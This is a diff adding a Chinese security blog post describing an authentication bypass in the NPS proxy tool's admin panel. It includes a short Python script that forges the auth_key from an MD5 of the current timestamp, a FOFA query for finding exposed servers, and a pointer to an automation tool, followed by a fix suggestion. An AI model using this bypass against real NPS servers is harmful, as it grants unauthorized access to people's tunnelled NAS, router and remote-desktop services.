@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>NPS权限绕过漏洞 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/6666/logo1.png')">
+            </div>
+          
+          <h2 class="post-title">NPS权限绕过漏洞</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-07-31</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/nps/">
+                    nps
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/bypass/">
+                    bypass
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>HVV期间爆出一个nps的权限绕过漏洞，会泄漏nps上配置的所有参数。记录备忘，<s>找个RT的倒霉蛋试试</s></p>
+<!-- more -->
+<h3 id="0x01-nps使用">0x01 NPS使用</h3>
+<p>代理一直用的都是Frp，刚好有时间对比一下哪个好用。安装就不介绍了，Github上有详细的中文文档进行说明。</p>
+<h4 id="1创建一个客户端">1.创建一个客户端</h4>
+<p>通过默认端口登录NPS后，选择左边客户端一栏，根据需要新增一个客户端。<strong>类比frp，就是开启frps</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/6666/server.png" alt="" loading="lazy"></p>
+<h4 id="2通过客户端进行连接">2.通过客户端进行连接</h4>
+<p>之后通过客户端进行连接，命令写在了客户端里面。<strong>类比frp，就是通过frpc进行连接</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/6666/client.png" alt="" loading="lazy"></p>
+<h4 id="3建立隧道进行转发">3.建立隧道进行转发</h4>
+<p>建立连接后，点击客户端右边的隧道，可以新建各种协议的代理转发。<br>
+<img src="https://tuchuang.looklook.workers.dev/6666/proxy.png" alt="" loading="lazy"><br>
+<strong>使用区别</strong>：Frp客户端连接服务端时，通过frpc.ini指定了隧道。NPS先连接服务端，后指定隧道。</p>
+<h3 id="0x02-后台权限绕过">0x02 后台权限绕过</h3>
+<p>具体可以看这篇<a href="https://mp.weixin.qq.com/s?__biz=MzIzNzk1NTU0Mw==&amp;mid=2247485761&amp;idx=1&amp;sn=f0490e3996b57fc7661c695c0c4d0769&amp;chksm=e8c1f9f9dfb670ef359c232e47cd1db085b7761382e8c3561237d49dfa86f9448c46af17f285&amp;scene=126&amp;sessionid=1659591235&amp;key=da9eb3f945dd83b4fbcf2346ee942ee1fa9a23f680cac3aab54c57c0d4cd7792d4ccce9dff38eae791134185878de42f4695f56af86ffb310d1775f0b5d1e21b46d39b07bd8b7723ca5f6acb65ee3dd18eaa6384b5fd16e3f469668186e856faebff73b6a4ab4160266409d7c7e976b1b0133c5d89a689de2be019f617d20f18&amp;ascene=15&amp;uin=NTY2NTA4NjQ%3D&amp;devicetype=Windows+Server+2016+x64&amp;version=63070517&amp;lang=zh_CN&amp;session_us=gh_448c3ce34ce8&amp;exportkey=AxDTaOJF3K2Pi%2BOyLNUQa%2BE%3D&amp;acctmode=0&amp;pass_ticket=OKvoVdO37NxWmSa%2ByxGFH37QrDn01XDAxV%2Fe6PqFsxr%2FM2aNAZnNMTRCCMzpEEvU&amp;wx_header=0&amp;fontgear=2">分析文章</a>，重点在于只要把时间戳进行MD5编码即可进行绕过。</p>
+<pre><code>import time
+import hashlib
+now = time.time()
+m = hashlib.md5()
+m.update(str(int(now)).encode(&quot;utf8&quot;))
+auth_key = m.hexdigest()
+
+print(&quot;Index/Index?auth_key=%s&amp;timestamp=%s&quot; % (auth_key,int(now)))
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/6666/time.png" alt="" loading="lazy"></figure>
+<h4 id="fofa语法bodyhttpsehangionps">fofa语法：body=&quot;https://ehang.io/nps&quot;</h4>
+<p>直接在浏览器进行拼接即可绕过。此时若点击其他状态栏会302跳转到登录框，<s>如果浏览器自动替换时间戳应该就不会跳转了。</s></p>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/6666/split.png" alt="" loading="lazy"></figure>
+<h3 id="0x03-自动化脚本">0x03 自动化脚本</h3>
+<p>参考这个<a href="https://github.com/0xf4n9x/NPS-AUTH-BYPASS">项目</a>进行自动替换即可。用法很简单一条命令进行抓包，浏览器设置成mitmproxy的代理端口，之后访问NPS地址会发现直接登录后台并可以进行操作了。<br>
+<img src="https://tuchuang.looklook.workers.dev/6666/proxy1.png" alt="" loading="lazy"></p>
+<h3 id="0x04-修复建议">0x04 修复建议</h3>
+<p>通过fofa一看一个准，全是大家nas、openwrt、mstsc的代理。自建的nps参考网上说的去掉auth_key还是可以进行复现，<strong>强烈建议作者下版本修复后再进行使用。</strong></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/CVE-2022-26923.html/">
+              <h3 class="post-title">
+                下一篇：CVE-2022-26923域提权漏洞复现
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
